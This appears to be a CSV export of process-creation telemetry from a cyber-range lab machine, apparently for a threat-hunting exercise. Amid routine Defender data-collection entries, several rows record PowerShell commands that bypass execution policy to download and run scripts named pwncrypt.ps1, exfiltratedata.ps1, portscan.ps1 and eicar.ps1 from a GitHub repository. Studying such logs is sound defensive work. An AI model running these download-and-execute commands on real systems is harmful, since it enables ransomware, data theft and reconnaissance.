Timestamp,ProcessCommandLine,FileName,FolderPath,SHA256
"Jun 16, 2025 9:36:41 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '5d2ed9ace3799faea1f7d1ce6b372b1b1549c2ef568f269e0da3c49bb70831f5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:18 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script12.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:18 AM",powershell  -ExecutionPolicy Unrestricted -File script12.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:19 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:19 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:13:22 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:13:23 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:24 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script13.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:24 AM",powershell  -ExecutionPolicy Unrestricted -File script13.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:25 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:25 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:25:28 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:25:28 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:11 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script14.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:11 AM",powershell  -ExecutionPolicy Unrestricted -File script14.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:12 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:12 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:37:16 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:37:16 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:00 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script15.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:00 AM",powershell  -ExecutionPolicy Unrestricted -File script15.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:01 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:01 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 10:49:05 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 10:49:05 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 11:30:44 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '671d163865ed6e6f4e6d40478bb315ec3cc97bda75d315a31e012fb17beffb50')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 11:31:24 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '9bba0ac96267c73775647edbd390867424ce69bf2bc4475c12304374eec6a461')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\211ef051-ecf9-4b99-9eed-76e45a831a19.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 11:47:04 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '420e8a8811873976aabed8aa7ac35735813707b91ab52e2f74f24d45dcb751eb')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 1:11:45 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '7f77a0c3c469abc006cb762cbe047417374e5729e73608ddf4d729fead6644d3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\1648ba23-91bf-4822-bd45-661d10a1ea81.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 1:12:55 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'd7a658288ffc136a83692b92ee05a6f6a5a8dad3020af48a04c4a3274f140883')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\3fa4876e-3ae5-4c59-9a4d-08a7400268a5.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 1:20:26 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '671d163865ed6e6f4e6d40478bb315ec3cc97bda75d315a31e012fb17beffb50')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 1:35:57 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'a82c6e6a6ea7e12ad7b6f4d282fb14e9d9aa670967295438b00498fd214d65e3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 1:54:17 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '153565a82e6ef1ee47ab1d4615394355b84e2cc70296974790e3cf6f33fec2f5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:02:28 PM",powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:16:54 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '5d2ed9ace3799faea1f7d1ce6b372b1b1549c2ef568f269e0da3c49bb70831f5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\08cabb5a-a9a4-4758-9e93-28d5bdfa77ef.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:31 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script16.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:31 PM",powershell  -ExecutionPolicy Unrestricted -File script16.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:33 PM",powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:33 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:34 PM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:43 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:43 PM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:31:05 PM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\149ae17f-1c51-47e8-90b8-8175a782d62b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\149ae17f-1c51-47e8-90b8-8175a782d62b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '568ea2b49cf01f1084b5fae05bd32e8297055f574d00f6775e37787c8fd5745c')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\149ae17f-1c51-47e8-90b8-8175a782d62b.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:20 PM",powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:23 PM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script17.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:37:23 PM",powershell  -ExecutionPolicy Unrestricted -File script17.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:25 PM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
